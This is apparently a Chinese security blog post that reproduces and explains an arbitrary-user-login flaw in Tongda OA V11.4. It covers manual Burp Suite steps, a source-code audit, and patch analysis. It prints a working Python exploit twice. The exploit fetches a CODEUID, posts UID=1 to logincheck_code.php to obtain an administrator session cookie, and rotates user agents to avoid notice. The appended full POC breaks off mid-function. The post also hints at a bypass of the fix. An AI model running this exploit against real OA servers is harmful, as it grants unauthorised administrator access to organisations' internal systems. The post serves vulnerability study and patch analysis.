<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>web漏洞@通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析 - 打渔为生</title>
  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=>
  
    <meta name="description" content="全平台漏洞挖掘手记">
  
  
  
    <link rel="alternate" href="/atom.xml " title="打渔为生" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.3.0"></head>

  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">打渔为生</a>
    <div class="subtitle">tutucoo的技术笔记</div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">主页</a>
        </li>
      
        <li class="menu-item">
          <a href="/summary" class="menu-item-link">Summary</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">关于</a>
        </li>
      
        <li class="menu-item">
          <a href="/atom.xml" class="menu-item-link">RSS</a>
        </li>
      
    </ul>
  </nav>
</header>

<article class="post">
  <div class="post-title">
    <h1 class="article-title">web漏洞@通达 OA Office Anywhere V11.4任意用户登录漏洞复现与原理详细解析</h1>
  </div>

  <!-- 文章目录 -->
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">1. 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-text">2. 漏洞环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81"><span class="toc-text">3. 漏洞验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">4. 漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="toc-text">4. 补丁分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E6%80%BB%E7%BB%93"><span class="toc-text">5. 总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%EF%BC%9APOC"><span class="toc-text">附：POC</span></a></li></ol>

  <div class="post-content">
    <h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>通达OA系统采用领先的B/S(浏览器/服务器)操作方式，使得网络办公不受地域限制。<br>Office Anywhere采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的<br>Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密码验证与登录验证机制更加强了系统安全性。</p>
<p>通达OA官方更新了V11版本安全补丁，修复了任意用户伪造登录漏洞，该漏洞的操作难度低，危害程度大。未经授权的攻击者通过构造请求包实现用户登录，又由于UID是主键且步进为1递增，从而导致可以指定UID实现任意用户登录（admin的缺省UID为1）。</p>
<h2 id="2-漏洞环境"><a href="#2-漏洞环境" class="headerlink" title="2. 漏洞环境"></a>2. 漏洞环境</h2><p><strong>官网</strong>：<a target="_blank" rel="noopener" href="https://www.tongda2000.com/">https://www.tongda2000.com/</a></p>
<p><strong>下载</strong>：<a target="_blank" rel="noopener" href="https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe</a></p>
<p><strong>版本</strong>：通达OA V11.X&lt;V11.5</p>
<p><strong>测试系统</strong>：<br>Windows 7 专业版 64位操作系统<br>macOS11.0.1<br>python3.7.5</p>
<h2 id="3-漏洞验证"><a href="#3-漏洞验证" class="headerlink" title="3. 漏洞验证"></a>3. 漏洞验证</h2><ul>
<li><p>下载并执行poc</p>
<p>进入这个地址下载poc:<a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a><br>执行poc，poc如果顺利执行会返回cookie<br> <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201205132816162_824661327.png"></p>
</li>
<li><p>任意用户登录</p>
<p>打开burp，开启代理，访问<a target="_blank" rel="noopener" href="http://192.168.3.104/general/index.php?isIE=0&amp;modify_pwd=0%EF%BC%8C%E6%9B%BF%E6%8D%A2cookie%E4%B8%AD%E7%9A%84PHPSESSID%E5%8F%82%E6%95%B0%E4%B8%BAPOC%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C%E8%8E%B7%E5%8F%96%E7%9A%84sessionid%EF%BC%8C%E7%84%B6%E5%90%8E%E6%94%BE%E5%8C%85">http://192.168.3.104/general/index.php?isIE=0&amp;modify_pwd=0，替换cookie中的PHPSESSID参数为POC脚本运行获取的sessionid，然后放包</a><br>   <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201205132835095_223465151.png"></p>
</li>
<li><p>切换到浏览器，可以看到已经使用系统管理员身份登录了后台<br> <img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201205133237726_1977377901.png"></p>
</li>
</ul>
<h2 id="4-漏洞原理"><a href="#4-漏洞原理" class="headerlink" title="4. 漏洞原理"></a>4. 漏洞原理</h2><p>POC的主要流程:</p>
<ol>
<li>首先会发送一条GET请求到/general/login_code.php，在其响应包中获取到其中的一串codeuid</li>
<li>发送一条POST请求到/logincheck_code.php，在其请求体中添加上一步获取到的codeuid以及uid=1，这里uid=1代表的是管理员权限，发送成功后会在其响应包中获取Cookie值，经过测试，使用app扫描登录时可以捕获到这条包</li>
<li>最后发送一条GET请求到/general/index.php，Cookie修改为上一步获取到的cookie值，然后就可以成功伪造身份并以管理员身份进入后台<br>POC核心代码如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    ...</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getV11Session</span>(<span class="params">url</span>):</span></span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS) <span class="comment">#随机挑选列表中的UserAgent</span></span><br><span class="line">        res = requests.get(checkUrl,headers=headers) <span class="comment">#通过组合checkUrl和UserAgent，发起一个get请求</span></span><br><span class="line">        resText = <span class="built_in">str</span>(res.text).split(<span class="string">&#x27;&#123;&#x27;</span>) <span class="comment">#分解请求的返回包，以&#123;为界限</span></span><br><span class="line">        codeUid = resText[-<span class="number">1</span>].replace(<span class="string">&#x27;&#125;&quot;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#获取返回包中的一串codeuid</span></span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        <span class="comment">#通过得到的的codeuid和uid，发送一个post请求到logincheck_code.php</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">&#x27;CODEUID&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>+codeUid+<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers)</span><br><span class="line">        tmp_cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]<span class="comment">#该POST请求返回了设置cookie的请求</span></span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS) <span class="comment">#重新选择一个UserAgent</span></span><br><span class="line">        headers[<span class="string">&quot;Cookie&quot;</span>] = tmp_cookie <span class="comment">#设置新的cookie</span></span><br><span class="line">        <span class="comment">#最后通过拼接UserAgent以及Cookie发送一个get请求到general/index.php</span></span><br><span class="line">        check_available = requests.get(url + <span class="string">&#x27;/general/index.php&#x27;</span>,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;用户未登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:<span class="comment"># 返回包如果不包含“用户未登录”这样的字眼表示登录成功</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;重新登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                print(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span> + tmp_cookie)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span> + url + <span class="string">&#x27;,Maybe Not Vulnerable.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
接下来，演示一下手动获取cookie，并实现任意用户登录<br>burp拦截打开，直接访问/general/login_code.php，拦截返回包，在返回包中可以看到返回的codeuid，保存起来，后面要用<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206130617360_586178304.png"><br>接着访问/logincheck_code.php，删去Cookie，data部分修改为CODEUID={xxx}&amp;UID=1，这里codeuid要填写上一步获取到的codeuid，如下图所示：</li>
</ol>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206131513403_553316630.png"><br>如果请求参数正确，返回包里的msg字段为空，否则会提示“参数不正确”，此时保存Set-Cookie里面的值，后面要用<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206131334282_1214772437.png"><br>最后访问/general/index.php，修改Cookie为上一步Set-Cookie的值1rp2qql0p3uloi87o7ogua6g32，点击forward获取到返回包，可以后台中包含的字眼了，如果请求失败，会返回“用户未登录”</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206132533523_740749525.png"><br>放出这条包，跳转到浏览器就可以直接进入后台了<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206133401538_814565016.png"></p>
<p>再通过源码了解下引起漏洞的原因是什么，所在php文件是logincheck_code.php，根据访问地址，可知logincheck_code.php在根目录下，找到该文件打开<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206201705889_1081135224.png"><br>直接打开文件看源码，乱码，显然是加密，通过文件头的标识Zend可知，加密方式为Zend加密<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206201807907_780572501.png"><br>不过Zend加密已经有相关的解密的工具，这里提供下载：<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1OdV5YxmNarmCVMZWYy4AuQ">https://pan.baidu.com/s/1OdV5YxmNarmCVMZWYy4AuQ</a><br>提取码：hw7o<br>工具使用方法也是傻瓜式的，很容易使用，这里就不进行演示了。<br>解密后可以看到文件内部的代码了，下面进行代码审计<br>可以看到logincheck_code.php的UID参数是可控的<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206222103129_104424784.png"><br>最重要的部分如下，系统通过获取到UID，再存储到session中，上面可以通过POST参数控制UID输入，有了可控输入和缓存，这就满足了用户伪造的两个重要的条件<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206222425782_573205089.png"><br>那么请求中为什么还需要CODEUID参数呢？翻一下文件可以看到有个if判断，如果login_codeuid为空就会提示“参数错误！”，而login_codeuid来自于get_cache，也就是说要获取CODEUID需要先设置cache，这样才能获得CODEUID。<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206224536532_246290381.png"><br>这个值应该也是由服务端返回，在源码中进行搜索，可以看到很多的结果，可以看到login_code.php（general/login_code和ispirit/login_code均可返回CODEUID），而POC中第一个发起的请求就是发往login_code.php，可见第一个请求的目的就是通过这个请求获取到CODEUID了</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206230341634_1201445698.png"><br>它是如何返回CODEUID的呢？我们以ispirit文件夹下的login_code.php为例进行查看<br>它会从参数codeuid获取值，如果没有传递codeuid，就会随机生成一个codeuid，最后通过echo显示，也就是说直接访问这个地址，就可以查看到codeuid了<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206231302417_1479707479.png"><br>login_code在ispirit文件夹下，直接访问，果然返回了codeuid<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206230910699_2056597192.png"><br>（另外一个文件general/login_code是通过返回二维码的形式将CODEUID返回的。）<br>这样，我们就得到了codeuid，现在就可以发送POST请求到logincheck_code了，通过它的响应包获取到了cookie，由于请求中的UID的值是1，也就是管理员，在发请求时将未登录cookie删除，服务端就会返回一个管理员的cookie了，这样再通过访问/general/index.php，也就是后台的首页地址，就可以实现任意用户登录了。<br>那么如何知道user=1就是管理员呢？<br>通达本地部署了一个mysql数据库，通过访问数据库就可以知道uid的存储情况<br>进入通达OA根目录，在mysql5目录下找到my.ini，里面有密码<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206231929803_1582967293.png"><br>进入bin文件夹下，右键打开控制台输入命令登录数据库</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206232404664_910952605.png"><br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206232437982_969512772.png"><br>查询数据库，可以看到uid=1的用户是admin<br><img src="https://gitee.com/tutucoo/images/raw/master/uPic/20201206232557583_1642729215.png"></p>
<h2 id="4-补丁分析"><a href="#4-补丁分析" class="headerlink" title="4. 补丁分析"></a>4. 补丁分析</h2><p>分析v11.5版本的源码，找到logincheck_code.php，可以看到不再接收UID参数了，而是转为接收TOKEN，然后把token作为key获取值，再对这个值进行解密，最后从解密后的数据中取出UID，解决了UID可控的问题，但是可以通过找到一处设置OA:authcode:token:的地方，或者找到一个可以控制键值的缓存，即可绕过</p>
<p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/image-20201219213424781.png" alt="image-20201219213424781"></p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>通达OA任意用户登录（伪造）是一个比较典型的任意用户登录漏洞，因此作为学习这类漏洞的案例还是比较有代表性的。<br>漏洞利用过程也比较简单，需要关注的是，在具备了可控输入参数UID和UID缓存到session中这两个条件时，就可能存在任意用户伪造漏洞了，再通过代码审计可知，需要codeuid的值，通过代码引用回溯，定位到获取codeuid的方法，最后通过发起存在漏洞点的请求获取到管理员cookie，然后在未登录的情况下访问后台时带上这个cookie，就可以实现以管理员的身份登录了，如果uid递增，也就是系统中存在的其他用户，也就实现了任意用户登录了。</p>
<h2 id="附：POC"><a href="#附：POC" class="headerlink" title="附：POC"></a>附：POC</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@Author         : Sp4ce</span></span><br><span class="line"><span class="string">@Date           : 2020-03-17 23:42:16</span></span><br><span class="line"><span class="string">LastEditors    : Sp4ce</span></span><br><span class="line"><span class="string">LastEditTime   : 2020-08-27 10:21:44</span></span><br><span class="line"><span class="string">@Description    : Challenge Everything.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">headers=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getV11Session</span>(<span class="params">url</span>):</span></span><br><span class="line">    checkUrl = url+<span class="string">&#x27;/general/login_code.php&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        res = requests.get(checkUrl,headers=headers)</span><br><span class="line">        resText = <span class="built_in">str</span>(res.text).split(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">        codeUid = resText[-<span class="number">1</span>].replace(<span class="string">&#x27;&#125;&quot;&#125;&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        getSessUrl = url+<span class="string">&#x27;/logincheck_code.php&#x27;</span></span><br><span class="line">        res = requests.post(</span><br><span class="line">            getSessUrl, data=&#123;<span class="string">&#x27;CODEUID&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>+codeUid+<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;UID&#x27;</span>: <span class="built_in">int</span>(<span class="number">1</span>)&#125;,headers=headers)</span><br><span class="line">        tmp_cookie = res.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">        headers[<span class="string">&quot;User-Agent&quot;</span>] = choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">&quot;Cookie&quot;</span>] = tmp_cookie</span><br><span class="line">        check_available = requests.get(url + <span class="string">&#x27;/general/index.php&#x27;</span>,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;用户未登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;重新登录&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> check_available.text:</span><br><span class="line">                print(<span class="string">&#x27;[+]Get Available COOKIE:&#x27;</span> + tmp_cookie)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span> + url + <span class="string">&#x27;,Maybe Not Vulnerable.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-]Something Wrong With &#x27;</span>+url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get2017Session</span>(<span class="params">url</span>):</span></span><br><span 